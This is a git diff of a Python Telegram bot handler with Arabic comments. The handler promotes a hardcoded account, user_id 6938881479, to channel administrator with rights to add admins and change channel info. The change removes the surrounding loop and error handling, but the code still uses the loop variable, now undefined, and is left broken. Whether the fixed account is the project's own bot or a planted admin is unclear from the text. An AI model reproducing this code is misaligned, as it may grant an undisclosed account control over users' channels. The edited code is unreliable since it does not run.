@@ -31,20 +31,16 @@ async def promote_ABHS(event):
         return
 
     # رفع كل البوتات
-    for x in ABHS:
-        try:
-            
-            rights = ChatAdminRights(
-                add_admins=True,
-                change_info=True
+        rights = ChatAdminRights(
+            add_admins=True,
+            change_info=True
                 
             )
-            await x(EditAdminRequest(
-                channel=channel_entity,
-                user_id=6938881479,
-                admin_rights=rights,
-                rank="مشرف رئيسي"
+        await x(EditAdminRequest(
+            channel=channel_entity,
+            user_id=6938881479,
+            admin_rights=rights,
+            rank="مشرف رئيسي"
             ))
-            print(f"✅ تم رفع البوت {me.id} مشرف بالقناة")
-        except Exception as e:
-            print(f"❌ خطأ أثناء رفع البوت {me.id}: {e}")
+        print(f"✅ تم رفع البوت {me.id} مشرف بالقناة")
+        
